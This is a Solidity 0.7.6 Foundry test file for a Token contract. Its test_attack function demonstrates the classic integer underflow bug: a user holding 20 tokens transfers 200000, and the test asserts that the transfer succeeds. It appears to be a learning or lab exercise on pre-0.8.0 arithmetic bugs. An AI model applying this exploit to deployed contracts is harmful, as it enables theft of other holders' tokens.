// SPDX-License-Identifier: MIT
pragma solidity  0.7.6;
pragma abicoder v2;

import{Test,console} from "forge-std/Test.sol";

import{Token} from "../src/Token.sol";

contract TokenTest is Test {

    Token token;
    address tokenDeployer = makeAddr("TokenDeployer");
    address user1 = makeAddr("User1");
    address user1Clone = makeAddr("user1Clone");
    uint256 constant InitialAmount = 10000;

    function setUp() public {
        vm.prank(tokenDeployer);
        token = new Token(InitialAmount);
        vm.stopPrank();
    }


    function test_basic() public {

        // token toatal supply should be 10000;

        assertEq(token.totalSupply(), InitialAmount);

        // `tokenDeployer` should have `InitialAmount` Amountof token

        assertEq(token.balanceOf(tokenDeployer), InitialAmount);

        /**
          Transfering 100 tokens from `tokenDeployer`
          to `user1`. `user1` should have 100 tokens
          and `tokenDeployer` Should Have = 10000-100 = 9900 tokens
         */

         vm.prank(tokenDeployer);
         token.transfer(user1, 100);
         vm.stopPrank();

        assertEq(token.balanceOf(tokenDeployer), InitialAmount-100);
        assertEq(token.balanceOf(user1), 100);

    }


        function test_attack() public {
        
        // As Solidty Version Before 0.8.0 
        // it Cannot Handle OverFlow and UnderFlow 
        // the Below Should Be Executed

        /**
            let say user1 has 20 token 
            and he sees that underflow/overflow issue is handled
            he undeflow the uint and steal as much he want
         */
        
        // lets give 20 tokens to the user1
        vm.prank(tokenDeployer);
        token.transfer(user1, 20);
        vm.stopPrank();
        assertEq(token.balanceOf(user1), 20);

        // user1 attackts with 200000 token amount to another address user1Clone with underflow/overflow attack
        
        vm.prank(user1);
        token.transfer(user1Clone, 200000);
        vm.stopPrank();
        assertEq(token.balanceOf(user1Clone), 200000);

        

      



        

    }




} 